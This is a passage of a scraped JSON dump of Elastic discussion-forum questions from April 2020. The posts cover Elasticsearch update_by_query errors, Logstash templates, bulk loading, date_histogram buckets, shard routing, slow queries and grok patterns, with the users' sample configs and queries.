\"blah\" } }, \"script\": { \"source\": \"ctx._source.user.email = params.email\", \"params\": { \"email\": \"abc@xyz.com\" } } } # No email shown in document GET objectexample/_doc/1 # But this works, kinda as it deletes already existing 'user' fields which I don't want. POST objectexample/_update_by_query { \"query\": { \"term\": { \"top_field\": \"blah\" } }, \"script\": { \"source\": \"ctx._source.user = params.user\", \"params\": { \"user\": { \"email\": \"abc@xyz.com\"} } } } ERROR from update_by_query: { \"error\": { \"root_cause\": [ { \"type\": \"script_exception\", \"reason\": \"runtime error\", \"script_stack\": [ \"ctx._source.user.email = params.email\", \" ^---- HERE\" ], \"script\": \"ctx._source.user.email = params.email\", \"lang\": \"painless\" } ], \"type\": \"script_exception\", \"reason\": \"runtime error\", \"script_stack\": [ \"ctx._source.user.email = params.email\", \" ^---- HERE\" ], \"script\": \"ctx._source.user.email = params.email\", \"lang\": \"painless\", \"caused_by\": { \"type\": \"null_pointer_exception\", \"reason\": null } }, \"status\": 500 } This is how I'd like the two documents to look like: # _id: 1 { \"top_field\" : \"blah\", \"user\" : { \"name\" : \"Bob Jones\", \"email\" : \"abc@xyz.com\" } } # _id: 2 { \"top_field\" : \"blah\", \"user\" : { \"email\" : \"abc@xyz.com\" } }",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "dbc8b0e4-c26d-4f20-b7ca-e6946d20a399",
    "url": "https://discuss.elastic.co/t/questions-on-helm-chart/228691",
    "title": "Questions on helm chart",
    "category": [
      "Elasticsearch"
    ],
    "author": "deepak_deore",
    "date": "April 19, 2020, 2:48am",
    "body": "with introduction of stable ECK operator, will official helm chart be deprecated? AFAIK helm chart installation doesn't renew the tls cert automatically, how to renew the certs when ES is installed with official helm chart?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "128a070c-59b7-49e8-8275-63db05c54ac7",
    "url": "https://discuss.elastic.co/t/deployment-health-status-healthy-with-warning/228684",
    "title": "Deployment Health Status : Healthy with warning",
    "category": [
      "Elasticsearch"
    ],
    "author": "bmbrit",
    "date": "April 18, 2020, 10:54pm April 19, 2020, 12:59am April 19, 2020, 1:00am",
    "body": "Hi, We are facing the following warning. image1567×775 74.3 KB Just wondering, if this is may cause any further problems or how can I resolve the warning. Currently, this deployment is in production and any restart might need attention. Please advise. Thanks, Brit",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "2298a12c-692b-4c2b-8f90-d30cd4f69c24",
    "url": "https://discuss.elastic.co/t/pattern-not-applied/228683",
    "title": "Pattern not applied",
    "category": [
      "Elasticsearch"
    ],
    "author": "woro",
    "date": "April 18, 2020, 9:53pm",
    "body": "Hi, I'm rather new to Elastic and now I'm running into a strange problem I do not understand and did not find the right pointer to fix it. I think everyone worked fine in the beginning but then I added a new input and output definition to logstash which most likely broke something but to me it does not make much sense. So the current scenario: I'm collecting via logstash from two different inputs. One is filebeat and the other http json. I want both to end up in different indexes and apply different filters. So I tag the JSON input manually with a certain tag (\"wforce\"): input { http { port => 8080 codec => json type => wforce_report add_field => { \"input\" => \"http\" } tags => [\"wforce\"] } } input { beats { port => 5044 tags => [\"beats\"] } } I skip the filter definitions since I do not think they are relevant here. Output definition looks like this: output { if \"wforce\" in [tags] { elasticsearch { hosts => \"elasticsearch:9200\" index => \"logstash-wforce-%{+YYYY.MM.dd}\" template => \"/tmp/templates/wforce_template.json\" template_name => \"wforce\" template_overwrite => true user => elastic password => changeme } } else { elasticsearch { hosts => \"elasticsearch:9200\" index => \"logstash-mail-%{+YYYY.MM.dd}\" user => elastic password => changeme } } } So the index definition works totally fine but something is strange with the template. { \"index_patterns\" : [\"logstash-wforce*\"], \"settings\" : { \"index.refresh_interval\" : \"5s\"}, \"mappings\" : { \"dynamic_templates\" : [ { \"minor_fields\" : { \"match\" : \"*minor\", \"mapping\" : { \"type\" : \"integer\", \"index\" : true } } }, { \"major_fields\" : { \"match\" : \"*major\", \"mapping\" : { \"type\" : \"integer\", \"index\" : true } } }, { \"string_fields\" : { \"match_mapping_type\" : \"string\", \"mapping\" : { \"type\" : \"keyword\", \"index\" : true } } } ], \"properties\" : { \"geoip\" : { \"dynamic\": true, \"properties\" : { \"ip\": { \"type\": \"ip\" }, \"location\" : { \"type\" : \"geo_point\" }, \"latitude\" : { \"type\" : \"half_float\" }, \"longitude\" : { \"type\" : \"half_float\" } } }, \"policy_reject\": { \"type\": \"boolean\" }, \"success\": { \"type\": \"boolean\"}, \"tls\": { \"type\": \"boolean\" }, \"t\": { \"type\": \"float\" } } } } Now what happens is that I certainly see in elastic in the index management's mapping tab that everything seems to be there. Especially also the minor_fields and major_fields definitions which should make sure these are saved as integers. But the index pattern fields does not have these as numbers but strings. E.g. the policy_reject boolean works but that just might be because ES recognizes it itself like this. Any pointer? Thanks, Wolfgang",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "d6fcb14f-b5c6-41c3-89c8-5c90d26f9242",
    "url": "https://discuss.elastic.co/t/es-failed-to-execute-bulk-item-index-index-shakespeare/228614",
    "title": "ES: failed to execute bulk item (index) index {[shakespeare]",
    "category": [
      "Elasticsearch"
    ],
    "author": "Dejrgn",
    "date": "April 18, 2020, 4:14pm April 18, 2020, 1:14pm April 18, 2020, 4:15pm April 18, 2020, 4:51pm April 18, 2020, 5:07pm April 18, 2020, 9:52pm",
    "body": "(Edited: replaced pictures from outputs by formated outputs) Hi all, first of all: I greatly appreciate it that you want to take your time to see what is going wrong in my project. I'm new to Elasticsearch and Kibana and I already experimented a very little bit with POST/GET/PUT-queries in ES (very basic stuff as I am new to query-language, http, and everything). Today I experimented a whole day to make exactly this tutorial to work. (See also this link). Even though I did exactly what is done in the tutorial, I failed, I don't get it to work how it is supposed to be and I have no clue about what's going wrong & how I can solve this problem to be able to start experimenting more with Elasticsearch. When I open Elasticsearch and execute this in Windows Powershell: PS C:\\Users\\Jurgen> Invoke-RestMethod \"http://localhost:9200/shakespeare/_bulk?pretty\" -Method Post -ContentType 'application/x-ndjson' -InFile \"shakespeare.json\" After waiting like 2 - 3 minutes I get this message in Windows Powershell: took errors items ---- ------ ----- 1023791 True {@{index=}, @{index=}, @{index=}, @{index=}...} Then, when I open my Elasticsearch screen I see many lines like these, repeating, but for different lines in the json-file, the output is extremely long, only showing a part of it: [2020-04-18T17:52:12,066][DEBUG][o.e.a.a.i.m.p.TransportPutMappingAction] [LAPTOP-Jurgen] failed to put mappings on indices [[[shakespeare/fIJuCa76RN62H72Ga8OKUQ]]], type [line] java.lang.IllegalArgumentException: Rejecting mapping update to [shakespeare] as the final mapping would have more than 1 type: [_doc, line] at org.elasticsearch.cluster.metadata.MetaDataMappingService$PutMappingExecutor.applyRequest(MetaDataMappingService.java:272) ~[elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.cluster.metadata.MetaDataMappingService$PutMappingExecutor.execute(MetaDataMappingService.java:238) ~[elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.cluster.service.MasterService.executeTasks(MasterService.java:702) ~[elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.cluster.service.MasterService.calculateTaskOutputs(MasterService.java:324) ~[elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.cluster.service.MasterService.runTasks(MasterService.java:219) [elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.cluster.service.MasterService.access$000(MasterService.java:73) [elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.cluster.service.MasterService$Batcher.run(MasterService.java:151) [elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.cluster.service.TaskBatcher.runIfNotProcessed(TaskBatcher.java:150) [elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.cluster.service.TaskBatcher$BatchedTask.run(TaskBatcher.java:188) [elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.common.util.concurrent.ThreadContext$ContextPreservingRunnable.run(ThreadContext.java:633) [elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.common.util.concurrent.PrioritizedEsThreadPoolExecutor$TieBreakingPrioritizedRunnable.runAndClean(PrioritizedEsThreadPoolExecutor.java:252) [elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.common.util.concurrent.PrioritizedEsThreadPoolExecutor$TieBreakingPrioritizedRunnable.run(PrioritizedEsThreadPoolExecutor.java:215) [elasticsearch-7.6.2.jar:7.6.2] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) [?:?] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) [?:?] at java.lang.Thread.run(Thread.java:830) [?:?] [2020-04-18T17:52:12,066][DEBUG][o.e.a.b.TransportShardBulkAction] [LAPTOP-Jurgen] [shakespeare][0] failed to execute bulk item (index) index {[shakespeare][line][111395], source[{\"line_id\":111396,\"play_name\":\"A Winters Tale\",\"speech_number\":38,\"line_number\":\"\",\"speaker\":\"LEONTES\",\"text_entry\":\"Exeunt\"}]} java.lang.IllegalArgumentException: Rejecting mapping update to [shakespeare] as the final mapping would have more than 1 type: [_doc, line] at org.elasticsearch.cluster.metadata.MetaDataMappingService$PutMappingExecutor.applyRequest(MetaDataMappingService.java:272) ~[elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.cluster.metadata.MetaDataMappingService$PutMappingExecutor.execute(MetaDataMappingService.java:238) ~[elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.cluster.service.MasterService.executeTasks(MasterService.java:702) ~[elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.cluster.service.MasterService.calculateTaskOutputs(MasterService.java:324) ~[elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.cluster.service.MasterService.runTasks(MasterService.java:219) [elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.cluster.service.MasterService.access$000(MasterService.java:73) [elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.cluster.service.MasterService$Batcher.run(MasterService.java:151) [elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.cluster.service.TaskBatcher.runIfNotProcessed(TaskBatcher.java:150) [elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.cluster.service.TaskBatcher$BatchedTask.run(TaskBatcher.java:188) [elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.common.util.concurrent.ThreadContext$ContextPreservingRunnable.run(ThreadContext.java:633) [elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.common.util.concurrent.PrioritizedEsThreadPoolExecutor$TieBreakingPrioritizedRunnable.runAndClean(PrioritizedEsThreadPoolExecutor.java:252) [elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.common.util.concurrent.PrioritizedEsThreadPoolExecutor$TieBreakingPrioritizedRunnable.run(PrioritizedEsThreadPoolExecutor.java:215) [elasticsearch-7.6.2.jar:7.6.2] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) [?:?] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) [?:?] at java.lang.Thread.run(Thread.java:830) [?:?] Then, when I go to to \"http://localhost:5601\" > Dev Tools and I execute following Kibana input: GET /shakespeare/_search?q=Romeo Kibana returns me this output: { \"took\" : 28, \"timed_out\" : false, \"_shards\" : { \"total\" : 1, \"successful\" : 1, \"skipped\" : 0, \"failed\" : 0 }, \"hits\" : { \"total\" : { \"value\" : 0, \"relation\" : \"eq\" }, \"max_score\" : null, \"hits\" : [ ] } } I expect it to be a very newbie-mistake but by far, googling my error messages didn't really get me anywhere and I also tried different ways of indexing the body of a json-file in Elasticsearch, e.g. using \"Postman\" instead of PowerShell but that also didn't really work... Thanks for having a look at this.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "ee8c1efb-b2af-4ebe-895c-cce4d99119d1",
    "url": "https://discuss.elastic.co/t/significant-terms-jlh-scientific-paper/228655",
    "title": "Significant_terms JLH scientific paper",
    "category": [
      "Elasticsearch"
    ],
    "author": "crab86",
    "date": "April 18, 2020, 3:31pm April 18, 2020, 8:36pm April 18, 2020, 8:38pm",
    "body": "Does anybody know if there is a scientific paper describing JLH as a statistical significance method? I did not find any document describing what JLH actually does - although i looked it up in the source code already. I was wondering if there simply is no such paper available or if JLH is just an elasticsearch name for another know statistical method? And by the way, what does JLH stand for?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "8baf1a18-b415-4875-ac06-32e65a0f44c2",
    "url": "https://discuss.elastic.co/t/match-query-with-type-phrase/228669",
    "title": "Match query with type phrase",
    "category": [
      "Elasticsearch"
    ],
    "author": "nages",
    "date": "April 18, 2020, 5:58pm",
    "body": "Is the following query equvalent to \"match phrase\" type of query { \"query\": { \"match\": { \"useragent.name.keyword\": { \"query\": \"Firefox\", \"type\": \"phrase\" } } } } I didnt see any reference related to - \" \"type\": \"phrase\" \" in the documentation https://www.elastic.co/guide/en/elasticsearch/reference/6.8/query-dsl-match-query.html",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "e9d7ed96-f843-4dab-b769-1bb4171204ec",
    "url": "https://discuss.elastic.co/t/artifacts-elastic-co-is-very-slow-cant-download-analysis-icu-plugin/228654",
    "title": "Artifacts.elastic.co is very slow? Can't download analysis-icu plugin",
    "category": [
      "Elasticsearch"
    ],
    "author": "vorapoap",
    "date": "April 18, 2020, 3:35pm April 18, 2020, 4:17pm",
    "body": "I have tried to download the analysis-icu plugin many times, but failed. Stuck at 1.1M, 1.4M 5.5M.. and halt.. Please help.. Why there is no mirror for aritifacts.elastic.co? wget https://artifacts.elastic.co/downloads/elasticsearch-plugins/analysis-icu/analysis-icu-6.8.4.zip 2020-04-18_2223401440×1002 86.6 KB Anyone can download this file?.. I have tried downloading from Linode /my fiber/4G... If you can please upload this file on some dropbox.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "1c051d63-785b-47ba-8b71-66b825cf0d5f",
    "url": "https://discuss.elastic.co/t/do-i-need-to-manually-copy-over-mappings-before-a-reindex-operation/226107",
    "title": "Do I need to manually copy over mappings before a reindex operation?",
    "category": [
      "Elasticsearch"
    ],
    "author": "ishanjain",
    "date": "April 1, 2020, 5:57pm April 2, 2020, 6:14am April 2, 2020, 5:54pm April 2, 2020, 9:03pm April 18, 2020, 3:17pm",
    "body": "Hi! I am trying to reindex multiple indexes into one. Right now, My code looks like this. Create the destination index with settings.number_of_replicas = 0. Iterate over source index one by one and reindex each index into the destination index. All source indexes are guaranteed to have the same mapping. Right now, I am not copying over mapping of one of the source index(since they are all the same) to destination index and this seems to be working fine. However, I am wondering if this is something I should do because I think it may help in better handling errors? I am not really a 100% sure. Here is what the reindex operation looks like, curl -XPOST \"http://elasticsearch:9200/_reindex?requests_per_second=115&wait_for_completion=true\" -H 'Content-Type: application/json' -d' { \"source\": { \"index\": \"analytics-prod-2019.12.30\", \"size\": 1000 }, \"dest\": { \"index\": \"analytics-prod-2019.12\" }, \"script\": { \"lang\": \"painless\", \"source\": \" ctx._source.index = ctx._index; def eventData = ctx._source[\\\"event.data\\\"]; if (eventData != null) { eventData.remove(\\\"realmDb.size\\\"); eventData.remove(\\\"realmDb.format\\\"); eventData.remove(\\\"realmDb.contents\\\"); }\" } }'",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "3cf1ecb4-994c-4676-8efc-64b53acdfb84",
    "url": "https://discuss.elastic.co/t/watcher-not-triggering-alerts/228304",
    "title": "Watcher not triggering alerts",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 18, 2020, 1:41pm April 18, 2020, 1:42pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "e28381e9-cca0-4875-ad86-2f194f8767c3",
    "url": "https://discuss.elastic.co/t/how-the-fixed-interval-time-buckets-were-divided-in-date-histogram-aggregation/228646",
    "title": "How the fixed_interval time buckets were divided in date_histogram aggregation?",
    "category": [
      "Elasticsearch"
    ],
    "author": "STAR_DEVX",
    "date": "April 18, 2020, 1:24pm",
    "body": "Hi, I'm puzzled with the how the time buckets are divided with the fixed_interval in date_histogram aggregations. I have the following simple query: { \"query\": { \"bool\": { \"filter\": [ {\"range\": {\"startTime\": {\"gte\": \"2020-03-01\", \"lte\": \"2020-03-14\" } } } ] } }, \"aggs\": { \"my_buckets\": { \"date_histogram\": { \"fixed_interval\": \"7d\", \"field\": \"startTime\" } } } } As you can see I want the data from 2020-03-01 to 2020-03-14, then I want the aggregation to be 7 days. My intuitive feeling was that elastic should give me two 7 day buckets, (2020-03-01 -> 2020-03-07), then (2020-03-08 -> 2020-03-14). However, it's not the case. Elastic gives me 3 buckets. (Thursday 2020-02-27 -> Wednesday 2020-03-04), (Thursday 2020-03-05 -> Wednesday 2020-03-11) and (Thursday 2020-03-12 -> Wednesday 2020-03-19), the time bucket does NOT align with the start or end of my range, OR the calendar week. I also tried different indexes, different query time ranges, but as long as my fixed_interval gives 7d, it always returns Thursday to Wednesday time buckets. This gives me the feeling that the data were probably pre-aggregated in the Thursday to Wednesday buckets in side elastic search. So elastic cannot give me dynamic 7 days time bucket based on my query time range. If my suspicion was true, this is quite a big limitation to my use cases Much appreciate if some one can help me understand the logic of the elastic date_histogram aggregation!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "9434ee4d-d7c0-48f7-925b-8638b55f024c",
    "url": "https://discuss.elastic.co/t/wrong-zone-used-for-query/228642",
    "title": "Wrong zone used for query?",
    "category": [
      "Elasticsearch"
    ],
    "author": "klahnakoski",
    "date": "April 18, 2020, 12:36pm April 18, 2020, 12:45pm",
    "body": "How do I ensure my queries are directed to nodes in the same zone? My queries are running slow, and I just learned about \"profile\": true,. In the profile I could see the slow [node][index][shard] that was causing the problem. It turns out the node was in another zone under heavy ingestion load (and maybe query load too). I did not expect this. My cluster has two zones primary and spot. The primary zone has 4 nodes, and all the shards and is under heavy load. The spot zone has 40 the nodes, with the same number of shards, so less shards per node. Finally, there is one coordinator node, in the spot zone, that accepts all query requests, and has no data. In theory the coordinator should be sending queries to the spot zone, not the primary zone. All nodes have the awareness attribute set cluster.routing.allocation.awareness.attributes: zone cluster.routing.allocation.enable: none and all nodes have node.attr.zone set to either primary or spot as per above. I am wondering if cluster.routing.allocation.enable: none may be causing the problem: Since it shares a prefix, maybe cluster.routing.allocation.awareness is also turned off? Thank you",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "09869365-841f-4d08-9d66-e724f20e18ae",
    "url": "https://discuss.elastic.co/t/loading-performance-what-should-i-expect/228621",
    "title": "Loading performance - what should I expect?",
    "category": [
      "Elasticsearch"
    ],
    "author": "shawmat",
    "date": "April 18, 2020, 7:28am April 18, 2020, 7:31am April 18, 2020, 7:36am April 18, 2020, 7:37am April 18, 2020, 11:47am",
    "body": "This is Day 1 of me using elasticsearch so apologies for the basic question. Line-by-line loading seems really slow, but I've no idea what to expect. I have 80 character text strings (lines of English words from books) and want to load about 400m of them as documents. But at 100 strings per second, this is nowhere near the speed I was expecting. However, the subsequent search on the first 5 million loaded is good. I have a single node dev machine with SSD drive, 16Gb RAM running Ubuntu 18.04 and Elasticsearch 7.6.2. No other major jobs are running. The load is being done from Python. I previously loaded the data into PostgreSQL in a few hours, which set my speed expectations. But, as you'd expect, the search performance wasn't good enough - hence looking at Elasticsearch. I'll persevere is people say \"yes, that's normal\".",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "adb4c5dd-b358-4a2b-9210-fa62bee10683",
    "url": "https://discuss.elastic.co/t/slow-query-where-to-start-v6-5-4/228404",
    "title": "Slow Query, where to start? (v6.5.4)",
    "category": [
      "Elasticsearch"
    ],
    "author": "klahnakoski",
    "date": "April 16, 2020, 9:03pm April 17, 2020, 3:31am April 17, 2020, 12:21pm April 18, 2020, 10:50am April 18, 2020, 10:55am",
    "body": "I am wondering if there is a solution to a slow-query problem I am having. Can it be a single, slow node? How do I find out? Maybe the query node is the bottleneck? It does not look busy, how to find out? The shards are too small? Half the shards will go twice as fast? Too many nodes? Half the nodes (with twice the shards) will reduce the maximum latency Maybe this it \"just big\"? This is a 40-node cluster with a number of indexes. The shards for each index have been spread evenly over the nodes to ensure each node picks up some of the query effort. Each shard is targeted to be about 20gigs in size so they can be moved/recovered within a reasonable amount of time. This particular query hits 9 indexes, each representing 3months of data, for a total of 180 shards Thank you Here is the slow query { \"_source\":false, \"from\":0, \"query\":{\"bool\":{\"should\":[ {\"bool\":{\"filter\":[ {\"nested\":{ \"inner_hits\":{ \"_source\":false, \"size\":100000, \"stored_fields\":[\"failure.notes.~N~.text.~s~\"] }, \"path\":\"failure.notes.~N~\", \"query\":{\"match_all\":{}} }}, {\"bool\":{\"filter\":[ {\"prefix\":{\"repo.changeset.id.~s~\":\"b760586ab7e62af195a44bbaa43b01be047c11db\"}}, {\"term\":{\"repo.branch.name.~s~\":\"autoland\"}}, {\"bool\":{\"must_not\":{\"term\":{\"run.tier.~n~\":3}}}}, {\"bool\":{\"must_not\":{\"term\":{\"run.result.~s~\":\"retry\"}}}}, {\"bool\":{\"must_not\":{\"term\":{\"job.type.name.~s~\":\"Gecko Decision Task\"}}}}, {\"bool\":{\"must_not\":{\"prefix\":{\"job.type.name.~s~\":\"Action\"}}}} ]}} ]}}, {\"bool\":{\"filter\":[ {\"prefix\":{\"repo.changeset.id.~s~\":\"b760586ab7e62af195a44bbaa43b01be047c11db\"}}, {\"term\":{\"repo.branch.name.~s~\":\"autoland\"}}, {\"bool\":{\"must_not\":{\"term\":{\"run.tier.~n~\":3}}}}, {\"bool\":{\"must_not\":{\"term\":{\"run.result.~s~\":\"retry\"}}}}, {\"bool\":{\"must_not\":{\"term\":{\"job.type.name.~s~\":\"Gecko Decision Task\"}}}}, {\"bool\":{\"must_not\":{\"prefix\":{\"job.type.name.~s~\":\"Action\"}}}} ]}} ]}}, \"size\":10000, \"sort\":[], \"stored_fields\":[ \"run.taskcluster.id.~s~\", \"run.taskcluster.retry_id.~n~\", \"job.type.name.~s~\", \"run.result.~s~\", \"failure.classification.~s~\", \"action.duration.~n~\" ] } Here is the result (minus most the actual records): { \"took\":5527, \"timed_out\":false, \"_shards\":{\"total\":180,\"successful\":180,\"skipped\":0,\"failed\":0}, \"hits\":{ \"total\":1953, \"max_score\":0, \"hits\":[{ \"_index\":\"treeherder20200401_000000\", \"_type\":\"th_job\", \"_id\":\"297002129\", \"_score\":0, \"fields\":{ \"job.type.name.~s~\":[\"test-linux1804-64-shippable/opt-awsy-base-e10s\"], \"run.result.~s~\":[\"success\"], \"run.taskcluster.retry_id.~n~\":[0], \"failure.classification.~s~\":[\"not classified\"], \"run.taskcluster.id.~s~\":[\"Cax7OVybTTuve3IR4nzNZg\"], \"action.duration.~n~\":[346] }, \"inner_hits\":{\"failure.notes.~N~\":{\"hits\":{\"total\":0,\"max_score\":null,\"hits\":[]}}} } ... For comparison, here is a simple count. It also takes long. { \"_source\":false, \"from\":0, \"query\":{\"match_all\":{}}, \"size\":0, \"sort\":[] } and the result { \"took\":2470, \"timed_out\":false, \"_shards\":{\"total\":180,\"successful\":180,\"skipped\":0,\"failed\":0}, \"hits\":{\"total\":158976878,\"max_score\":0,\"hits\":[]} }",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "4896c3f7-e11e-4836-bc79-840fb476a810",
    "url": "https://discuss.elastic.co/t/perform-recovery-twice-when-the-full-cluster-restarts/228633",
    "title": "Perform recovery twice when the full cluster restarts",
    "category": [
      "Elasticsearch"
    ],
    "author": "yc1024",
    "date": "April 18, 2020, 10:01am",
    "body": "Elasticsearch version：7.6.0 When I perform a full cluster restart, when active_shards_percent_as_number> 90%, a new recovery is triggered.Why did it recover twice？ I find the log as follows: recovered [582] indices into cluster_state",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "cd379b4f-921a-4601-a7db-87c335333370",
    "url": "https://discuss.elastic.co/t/how-can-i-get-the-bucket-script-result-unconditionally-even-when-the-value-is-0/228631",
    "title": "How can I get the bucket script result unconditionally even when the value is 0?",
    "category": [
      "Elasticsearch"
    ],
    "author": "Yungyoung_Ok",
    "date": "April 18, 2020, 9:41am",
    "body": "1.Calculate the total time using sum aggs. 2. Calculate the number of users using cardinality aggs. 3. Count the total time/number of users using a bucket script to get the average time. However, if the total time is 0 or the number of users is 0, bucket script results are not provided. How can I set it to 0 if there is no current value?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "6e63cddc-2a03-4b5f-8bb9-874787ec0623",
    "url": "https://discuss.elastic.co/t/store-render-and-search-different-types-of-semi-structured-data-in-elasticsearch/228511",
    "title": "Store, render and search different types of semi-structured data in elasticsearch",
    "category": [
      "Elasticsearch"
    ],
    "author": "jgeek",
    "date": "April 17, 2020, 12:20pm April 17, 2020, 2:20pm April 18, 2020, 6:28am April 18, 2020, 7:54am April 18, 2020, 8:41am",
    "body": "We have a couple of different features in our application both of which have different types of semi-structured data sets. One of them has a json data set (rest api responses) while other has html files that includes audio & video content (documentation portal). We need to a storage, rendering (show file content especially) and full text search solution on both of them. Can elasticsearch be used a common solution for both of these data sets? I assume elasticsearch is not meant to store audio and video files (could be in few hundreds of MB's). What are the standard alternatives for these audio/video files? We don't need to search the audio/video file content - just store them and serve them for rendering. Thanks.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "a7344380-98fc-4d77-a3db-62b2022602a9",
    "url": "https://discuss.elastic.co/t/grok-strange-issue/228618",
    "title": "GROK strange issue",
    "category": [
      "Elasticsearch"
    ],
    "author": "brunus0475",
    "date": "April 18, 2020, 5:28am",
    "body": "Hi All, where is my configuration error, we've only moved the timestamp field at the start of the message: ## GROK NOT WORK POST /_ingest/pipeline/_simulate { \"pipeline\": { \"processors\": [ { \"grok\": { \"field\": \"message\", \"patterns\": [\"\"\"%{TIMESTAMP_ISO8601:@timestamp} %{IP:client} %{WORD:method} %{URIPATHPARAM:request} %{NUMBER:bytes} %{NUMBER:duration} %{TIMESTAMP_ISO8601:@timestamp}\"\"\"] } } ] }, \"docs\": [ { \"_source\": { \"message\": \"2019-09-29T00:39:02.91ZZ 55.3.244.1 GET /index.html 15824 0.043 \" } } ] } ## GROK WORKS FINE POST /_ingest/pipeline/_simulate { \"pipeline\": { \"processors\": [ { \"grok\": { \"field\": \"message\", \"patterns\": [\"\"\"%{IP:client} %{WORD:method} %{URIPATHPARAM:request} %{NUMBER:bytes} %{NUMBER:duration} %{TIMESTAMP_ISO8601:@timestamp}\"\"\"] } } ] }, \"docs\": [ { \"_source\": { \"message\": \"55.3.244.1 GET /index.html 15824 0.043 2019-09-29T00:39:02.91ZZ\" } } ] }",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "5792b4a1-aa70-4acd-a180-b48f55f69125",
    "url": "https://discuss.elastic.co/t/filter-range-on-different-fields-in-elasticsearch/228613",
    "title": "Filter (RANGE) on different fields in elasticsearch",
    "category": [
      "Elasticsearch"
    ],
    "author": "jeanpjm",
    "date": "April 18, 2020, 5:07am",
    "body": "Hello people, I'm a beginner in elasticsarch and I wanted this query below to work with two RANGE filters in different fields, but only the first RANGE is working. This filter below is working normally: \"range\" : {\"pgrk\" : { \"gte\" : 1, \"lte\" : 10} } Could someone tell me why this second filter below doesn't work? \"should\" : { \"range\" : {\"url_length\" : { \"gte\" : 50, \"lte\" : 100 } } --------------------------Follow my query below with the two filters-------------------------- { \"from\" : 0, \"size\" : 10, \"sort\" : [ { \"pgrk\" : {\"order\" : \"desc\"} }, { \"url_length\" : {\"order\" : \"asc\"} } ], \"query\": { \"bool\": { \"must\": { \"multi_match\" : { \"query\": \"netflix\", \"type\": \"cross_fields\", \"fields\": [ \"titulo\", \"descricao\", \"url\" ], \"operator\": \"and\" } }, \"filter\": { \"range\" : {\"pgrk\" : { \"gte\" : 1, \"lte\" : 10 } } }, \"should\" : { \"range\" : {\"url_length\" : { \"gte\" : 50, \"lte\" : 100 } } } } } }",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "818a8b9d-8de6-4828-86dc-29e72d68e505",
    "url": "https://discuss.elastic.co/t/i-use-a-certificate-with-a-password-elastic-certificates-p12-how-to-add-configuration-to-docker-and-docker-compose/228609",
    "title": "I use a certificate with a password: elastic-certificates.p12, how to add configuration to docker and docker-compose",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 18, 2020, 2:54am",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "58662780-2990-4353-8021-edeea3f19e50",
    "url": "https://discuss.elastic.co/t/opendistro-elasticsearch-repository-empty-after-restart/228595",
    "title": "OpenDistro Elasticsearch - Repository Empty After Restart",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 17, 2020, 10:28pm April 18, 2020, 2:21am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "95bd894e-fb07-4934-a285-f55cea34190b",
    "url": "https://discuss.elastic.co/t/cannot-add-a-node-to-cluster-on-remote-host/228606",
    "title": "Cannot add a node to cluster on remote host",
    "category": [
      "Elasticsearch"
    ],
    "author": "yk928",
    "date": "April 18, 2020, 2:08am",
